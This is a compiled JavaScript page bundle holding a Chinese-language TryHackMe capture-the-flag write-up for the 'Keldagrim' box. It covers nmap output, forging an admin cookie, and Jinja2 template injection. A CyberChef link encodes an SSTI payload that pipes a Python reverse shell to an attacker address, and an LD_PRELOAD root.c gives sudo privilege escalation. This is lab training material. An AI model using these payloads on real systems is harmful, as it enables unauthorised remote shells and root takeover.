"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9364],{2199:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>h,frontMatter:()=>a,metadata:()=>l,toc:()=>d});var t=i(74848),s=i(28453);const a={sidebar_position:143,tags:["Easy","Linux","SSTI","PATH"],title:"Keldagrim",description:"Keldagrim",sidebar_label:"Keldagrim",slug:"/tryhackme/143"},r="Keldagrim",l={id:"box/TryHackMe/143",title:"Keldagrim",description:"Keldagrim",source:"@site/docs/box/TryHackMe/143.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/143",permalink:"/docs/tryhackme/143",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SSTI",permalink:"/docs/tags/ssti"},{label:"PATH",permalink:"/docs/tags/path"}],version:"current",sidebarPosition:143,frontMatter:{sidebar_position:143,tags:["Easy","Linux","SSTI","PATH"],title:"Keldagrim",description:"Keldagrim",sidebar_label:"Keldagrim",slug:"/tryhackme/143"},sidebar:"boxSidebar",previous:{title:"SafeZone",permalink:"/docs/tryhackme/142"},next:{title:"Undiscovered",permalink:"/docs/tryhackme/144"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"jed",id:"jed",level:3}];function o(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"keldagrim",children:"Keldagrim"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-80-215:~/keldagrim# nmap -sTCV -p 22,80 --min-rate 1000 10.10.16.204\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-05 02:53 BST\nNmap scan report for ip-10-10-16-204.eu-west-1.compute.internal (10.10.16.204)\nHost is up (0.00015s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)\n|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)\n|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (EdDSA)\n80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)\n| http-cookie-flags: \n|   /: \n|     session: \n|_      httponly flag not set\n|_http-title:  Home page \nMAC Address: 02:DC:1D:83:9C:2B (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.34 seconds\n"})}),"\n",(0,t.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u5728\u6b64\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\u4f46\u662f\u5f88\u53ef\u60dc\u901f\u5ea6\u975e\u5e38\u6162, \u800c\u4e14\u626b\u63cf\u7684\u7ed3\u679c\u4e5f\u662f\u4e0d\u91cd\u8981\u7684. \u6211\u4eec\u76f4\u63a5\u770b\u7f51\u7ad9, \u5728\u67e5\u770b\u7f51\u9875\u7684\u6d41\u91cf\u65f6\u6211\u53d1\u73b0\u5176 cookie \u7684\u5185\u5bb9\u975e\u5e38\u7684\u7279\u6b8a"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-173330.png",alt:"image-20240709173328567"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f53\u6211\u5c06\u5176\u89e3\u5bc6\u540e\u53d1\u73b0\u5176\u662f guest \u7684\u610f\u8bc6, \u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u6362\u6210 admin \u7684 base64 \u8fdb\u884c\u64cd\u4f5c, \u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6211\u4eec\u7684\u7ba1\u7406\u5458\u9875\u9762\u4e86, \u6ce8\u610f\u6b64\u65f6\u7684\u9875\u9762\u8fd4\u56de\u4fe1\u606f\u4ee5\u53ca cookie , \u5728 cookie \u4e2d\u6709\u4e00\u4e2a\u72ec\u7279\u7684\u5185\u5bb9 sales \u5982\u679c\u4f60\u5c06\u5176\u89e3\u5bc6\u4f60\u4f1a\u53d1\u73b0\u5176\u5c31\u662f$2,165 , \u6240\u4ee5\u6b64\u65f6\u8fd8\u7b49\u5f85\u4ec0\u4e48\u76f4\u63a5 SSTI \u8d70\u8d77"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-173336.png",alt:"image-20240709173335115"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7ecf\u8fc7\u4e00\u7cfb\u5217\u5224\u65ad\u6211\u6700\u7ec8\u5224\u5b9a\u662f\u4e00\u4e2a ",(0,t.jsx)(n.a,{href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2",children:"Jinja2"})," \u7684\u7a0b\u5e8f"]}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"jed",children:"jed"}),"\n",(0,t.jsxs)(n.p,{children:["\u5229\u7528\u6211\u4eec\u7684 SSTI \u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell ",(0,t.jsx)(n.a,{href:"https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9+/=')&input=e3sgbGlwc3VtLl9fZ2xvYmFsc19fWyJvcyJdLnBvcGVuKCdlY2hvIGNIbDBhRzl1TXlBdFl5QW5hVzF3YjNKMElITnZZMnRsZEN4emRXSndjbTlqWlhOekxHOXpPM005YzI5amEyVjBMbk52WTJ0bGRDaHpiMk5yWlhRdVFVWmZTVTVGVkN4emIyTnJaWFF1VTA5RFMxOVRWRkpGUVUwcE8zTXVZMjl1Ym1WamRDZ29JakV3TGpFd0xqZ3dMakl4TlNJc05EUTBOQ2twTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3d0tUc2diM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHBiWEJ2Y25RZ2NIUjVPeUJ3ZEhrdWMzQmhkMjRvSWk5aWFXNHZZbUZ6YUNJcEp3PT0gfCBiYXNlNjQgLWQgfCBiYXNoJykucmVhZCgpIH19",children:"CyberChef"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-173359.png",alt:"image-20240709173358206"})}),"\n",(0,t.jsx)(n.p,{children:"###jed \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u53d1\u73b0 jed \u5b58\u5728 SUDO \u7279\u6743\u5e76\u4e14\u5b58\u5728\u4e00\u4e2a\u7279\u6b8a\u7684\u6743\u9650"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-173408.png",alt:"image-20240709173407278"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,t.jsx)(n.a,{href:"https://www.notion.so/LD_PRELOAD-LD_LIBRARY_PATH-d67a93f6157c41e6aefdae03bb4c89c6?pvs=21",children:"LD_PRELOAD\u548cLD_LIBRARY_PATH"})," \u8fdb\u884c\u64cd\u4f5c"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u521b\u5efa\u6211\u4eec\u7684 root.c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-80-215:~/keldagrim# cat root.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    setuid(0);\n    system("/bin/bash");\n}\n'})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u5c06 root.c \u4e0a\u4f20\u5e76\u7f16\u8bd1\u540e\u8fdb\u884c\u6307\u5b9a\u8fd0\u884c"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-173424.png",alt:"image-20240709173423089"})}),"\n"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},28453:(e,n,i)=>{i.d(n,{R:()=>r,x:()=>l});var t=i(96540);const s={},a=t.createContext(s);function r(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);